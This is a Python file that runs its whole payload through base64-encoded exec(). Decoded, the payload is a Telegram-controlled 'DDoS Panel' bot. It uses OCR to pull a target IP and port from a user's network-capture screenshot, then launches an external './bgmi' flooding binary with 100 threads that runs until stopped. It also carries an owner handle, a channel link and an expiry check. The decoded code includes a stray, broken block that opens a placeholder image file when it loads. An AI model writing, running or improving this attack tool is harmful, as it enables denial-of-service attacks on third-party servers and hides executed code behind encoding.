import base64
exec(base64.b64decode('''aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQgc3lzCmltcG9ydCBzaWduYWwKaW1wb3J0IHN1YnByb2Nlc3MKZnJvbSBpbyBpbXBvcnQgQnl0ZXNJTwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIFBJTCBpbXBvcnQgSW1hZ2UKaW1wb3J0IHB5dGVzc2VyYWN0CmZyb20gdGVsZWdyYW0gaW1wb3J0IFVwZGF0ZSwgUmVwbHlLZXlib2FyZE1hcmt1cCwgS2V5Ym9hcmRCdXR0b24sIFJlcGx5S2V5Ym9hcmRSZW1vdmUKZnJvbSB0ZWxlZ3JhbS5leHQgaW1wb3J0IEFwcGxpY2F0aW9uLCBDb21tYW5kSGFuZGxlciwgTWVzc2FnZUhhbmRsZXIsIGZpbHRlcnMsIENvbnRleHRUeXBlcwpmcm9tIGNvbmZpZyBpbXBvcnQgVEVMRUdSQU1fQk9UX1RPS0VOCgpzZWxlY3RlZF90YXJnZXQgPSB7fQphdHRhY2tfcHJvY2VzcyA9IE5vbmUKCmltcG9ydCBweXRlc3NlcmFjdApmcm9tIFBJTCBpbXBvcnQgSW1hZ2UKCiMgSU1QT1JUQU5UOiBTZXQgdGVzc2VyYWN0IHBhdGgKcHl0ZXNzZXJhY3QucHl0ZXNzZXJhY3QudGVzc2VyYWN0X2NtZCA9ICIvdXNyL2Jpbi90ZXNzZXJhY3QiCgppbWcgPSBJbWFnZS5vcGVuKCJ5b3VyX2ltYWdlLnBuZyIpCnRleHQgPSBweXRlc3NlcmFjdC5pbWFnZV90b19zdHJpbmcoaW1nKQoKcHJpbnQodGV4dCkKCiMg8J+SoyBGaXhlZCBJbmZvIChzYWZlIGluc2lkZSBkYWt1LnB5KQpPV05FUl9VU0VSTkFNRSA9ICdAREFSSU5EQXhPV05FUicKQ0hBTk5FTF9MSU5LID0gJ2h0dHBzOi8vdC5tZS8rNzQ0cGlmdXZ3LW8xWlRJOScKRVhQSVJZX0RBVEUgPSBkYXRldGltZSgyMDI1LCA3LCAyOCkKCmRlZiBjaGVja19leHBpcnkoKToKICAgIGlmIGRhdGV0aW1lLm5vdygpID4gRVhQSVJZX0RBVEU6CiAgICAgICAgcHJpbnQoZiLinYwgVGhpcyBib3QgaGFzIGV4cGlyZWQuIEpvaW4ge09XTkVSX1VTRVJOQU1FfSB0byBnZXQgYSBuZXcgdmVyc2lvbi4iKQogICAgICAgIHN5cy5leGl0KCkKCmRlZiB3ZWxjb21lX2Jhbm5lcigpOgogICAgYmFubmVyID0gZiIiIgrilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAK8J+UpSBXRUxDT01FIFRPIERBUklOREEgVklQIFRPT0wg8J+UpQoK8J+SoyBQcmVtaXVtIERET1MgUGFuZWwg8J+Sowrwn5SSIFNlY3VyZSBBY2Nlc3MgT25seQrwn5GRIE93bmVyOiB7T1dORVJfVVNFUk5BTUV9Cgrwn5OiIEpvaW4gb3VyIGNoYW5uZWw6CuKeoe+4jyB7Q0hBTk5FTF9MSU5LfQrilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKIiIiCiAgICBwcmludChiYW5uZXIpCgpkZWYgZXh0cmFjdF9pcF9wb3J0X2Zyb21faW1hZ2UoaW1hZ2U6IEltYWdlLkltYWdlKToKICAgIHRleHQgPSBweXRlc3NlcmFjdC5pbWFnZV90b19zdHJpbmcoaW1hZ2UpCiAgICBtYXRjaGVzID0gcmUuZmluZGFsbChyIihcZCtcLlxkK1wuXGQrXC5cZCspWzpcc10oMTAwXGQrKSIsIHRleHQpCiAgICBpZiBtYXRjaGVzOgogICAgICAgIHJldHVybiBtYXRjaGVzWzBdWzBdLCBpbnQobWF0Y2hlc1swXVsxXSkKICAgIHJldHVybiBOb25lLCBOb25lCgphc3luYyBkZWYgc3RhcnQodXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOgogICAgYXdhaXQgdXBkYXRlLm1lc3NhZ2UucmVwbHlfdGV4dCgKICAgICAgICAi8J+kliAqRERvUyBQYW5lbCBCb3QgYnkgREFSSU5EQXhPV05FUipcblxuIgogICAgICAgICLwn5O4IFBsZWFzZSBzZW5kIGEgY2xlYXIgSHR0cENhbmFyeSBzY3JlZW5zaG90IHRvIGF1dG9tYXRpY2FsbHkgZXh0cmFjdCB0aGUgSVAgYW5kIFBvcnQgKFBvcnQgbXVzdCBzdGFydCB3aXRoIGAxMDAqKmApLlxuXG4iCiAgICAgICAgIuKsh++4jyBPbmNlIHRhcmdldCBpcyBkZXRlY3RlZCwgdXNlIHRoZSBidXR0b25zIGJlbG93IHRvICpzdGFydCogb3IgKnN0b3AqIHRoZSBhdHRhY2suXG5cbiIKICAgICAgICAiX05vdGU6IEJ1dHRvbnMgd2lsbCBhbHdheXMgcmVtYWluIHZpc2libGUgZm9yIGVhc3kgY29udHJvbC5fIiwKICAgICAgICBwYXJzZV9tb2RlPSJNYXJrZG93biIKICAgICkKCmFzeW5jIGRlZiBoYW5kbGVfcGhvdG8odXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOgogICAgcGhvdG8gPSB1cGRhdGUubWVzc2FnZS5waG90b1stMV0KICAgIGZpbGUgPSBhd2FpdCBwaG90by5nZXRfZmlsZSgpCiAgICBpbWFnZV9ieXRlcyA9IGF3YWl0IGZpbGUuZG93bmxvYWRfYXNfYnl0ZWFycmF5KCkKICAgIGltYWdlID0gSW1hZ2Uub3BlbihCeXRlc0lPKGltYWdlX2J5dGVzKSkKCiAgICBpcCwgcG9ydCA9IGV4dHJhY3RfaXBfcG9ydF9mcm9tX2ltYWdlKGltYWdlKQoKICAgIGlmIGlwIGFuZCBwb3J0OgogICAgICAgIHNlbGVjdGVkX3RhcmdldFt1cGRhdGUuZWZmZWN0aXZlX2NoYXQuaWRdID0gKGlwLCBwb3J0KQoKICAgICAgICBrZXlib2FyZCA9IFtbS2V5Ym9hcmRCdXR0b24oIvCfmoAgQXR0YWNrIiksIEtleWJvYXJkQnV0dG9uKCLim5QgU3RvcCIpXV0KICAgICAgICByZXBseV9tYXJrdXAgPSBSZXBseUtleWJvYXJkTWFya3VwKGtleWJvYXJkLCByZXNpemVfa2V5Ym9hcmQ9VHJ1ZSkKCiAgICAgICAgYXdhaXQgdXBkYXRlLm1lc3NhZ2UucmVwbHlfdGV4dCgKICAgICAgICAgICAgZiLwn46vIFRhcmdldCBEZXRlY3RlZDpcbmB7aXB9Ontwb3J0fWBcblxuQ2hvb3NlIGFjdGlvbjoiLAogICAgICAgICAgICBwYXJzZV9tb2RlPSJNYXJrZG93biIsCiAgICAgICAgICAgIHJlcGx5X21hcmt1cD1yZXBseV9tYXJrdXAKICAgICAgICApCiAgICBlbHNlOgogICAgICAgIGF3YWl0IHVwZGF0ZS5tZXNzYWdlLnJlcGx5X3RleHQoIuKdjCBJUC9Qb3J0IG5vdCBmb3VuZC4gU2VuZCBjbGVhciBzY3JlZW5zaG90LiIpCgphc3luYyBkZWYgaGFuZGxlX2FjdGlvbih1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6CiAgICBnbG9iYWwgYXR0YWNrX3Byb2Nlc3MKICAgIGNoYXRfaWQgPSB1cGRhdGUuZWZmZWN0aXZlX2NoYXQuaWQKICAgIHRleHQgPSB1cGRhdGUubWVzc2FnZS50ZXh0LnN0cmlwKCkKCiAgICBpZiBjaGF0X2lkIG5vdCBpbiBzZWxlY3RlZF90YXJnZXQ6CiAgICAgICAgYXdhaXQgdXBkYXRlLm1lc3NhZ2UucmVwbHlfdGV4dCgi4p2MIE5vIHRhcmdldCBzZWxlY3RlZC4iKQogICAgICAgIHJldHVybgoKICAgIGlwLCBwb3J0ID0gc2VsZWN0ZWRfdGFyZ2V0W2NoYXRfaWRdCgogICAgaWYgdGV4dCA9PSAi8J+agCBBdHRhY2siOgogICAgICAgIGlmIGF0dGFja19wcm9jZXNzOgogICAgICAgICAgICBhd2FpdCB1cGRhdGUubWVzc2FnZS5yZXBseV90ZXh0KCLimqDvuI8gQWxyZWFkeSBydW5uaW5nISIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICAjIE5vIGR1cmF0aW9uIHNvIHJ1bnMgdW50aWwgbWFudWFsbHkgc3RvcHBlZAogICAgICAgIHBhY2tldF9zaXplID0gMTAwCiAgICAgICAgdGhyZWFkcyA9IDEwMAogICAgICAgIGNvbW1hbmQgPSBbIi4vYmdtaSIsIGlwLCBzdHIocG9ydCksICI5OTk5Iiwgc3RyKHBhY2tldF9zaXplKSwgc3RyKHRocmVhZHMpXQoKICAgICAgICBhdHRhY2tfcHJvY2VzcyA9IHN1YnByb2Nlc3MuUG9wZW4oY29tbWFuZCkKCiAgICAgICAgYXdhaXQgdXBkYXRlLm1lc3NhZ2UucmVwbHlfdGV4dCgKICAgICAgICAgICAgZiLwn5SlIEF0dGFjayBTdGFydGVkIVxu8J+OryBge2lwfTp7cG9ydH1gXG5cbuKPue+4jyBVc2UgU3RvcCBidXR0b24gdG8gZW5kLiIsCiAgICAgICAgICAgIHBhcnNlX21vZGU9Ik1hcmtkb3duIgogICAgICAgICkKCiAgICBlbGlmIHRleHQgPT0gIuKblCBTdG9wIjoKICAgICAgICBpZiBhdHRhY2tfcHJvY2VzcyBhbmQgYXR0YWNrX3Byb2Nlc3MucG9sbCgpIGlzIE5vbmU6CiAgICAgICAgICAgIG9zLmtpbGwoYXR0YWNrX3Byb2Nlc3MucGlkLCBzaWduYWwuU0lHSU5UKQogICAgICAgICAgICBhdHRhY2tfcHJvY2Vzcy53YWl0KCkKICAgICAgICAgICAgYXR0YWNrX3Byb2Nlc3MgPSBOb25lCiAgICAgICAgICAgIGF3YWl0IHVwZGF0ZS5tZXNzYWdlLnJlcGx5X3RleHQoIuKchSBBdHRhY2sgc3RvcHBlZC4iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGF3YWl0IHVwZGF0ZS5tZXNzYWdlLnJlcGx5X3RleHQoIuKEue+4jyBObyBydW5uaW5nIGF0dGFjay4iKQoKZGVmIG1haW4oKToKICAgIGNoZWNrX2V4cGlyeSgpCiAgICB3ZWxjb21lX2Jhbm5lcigpCiAgICAKICAgIGFwcCA9IEFwcGxpY2F0aW9uLmJ1aWxkZXIoKS50b2tlbihURUxFR1JBTV9CT1RfVE9LRU4pLmJ1aWxkKCkKICAgIGFwcC5hZGRfaGFuZGxlcihDb21tYW5kSGFuZGxlcigic3RhcnQiLCBzdGFydCkpCiAgICBhcHAuYWRkX2hhbmRsZXIoTWVzc2FnZUhhbmRsZXIoZmlsdGVycy5QSE9UTywgaGFuZGxlX3Bob3RvKSkKICAgIGFwcC5hZGRfaGFuZGxlcihNZXNzYWdlSGFuZGxlcihmaWx0ZXJzLlRFWFQgJiB+ZmlsdGVycy5DT01NQU5ELCBoYW5kbGVfYWN0aW9uKSkKICAgIHByaW50KCLwn6SWIEJvdCBpcyBydW5uaW5nLi4uIikKICAgIGFwcC5ydW5fcG9sbGluZygpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigpCg=='''))
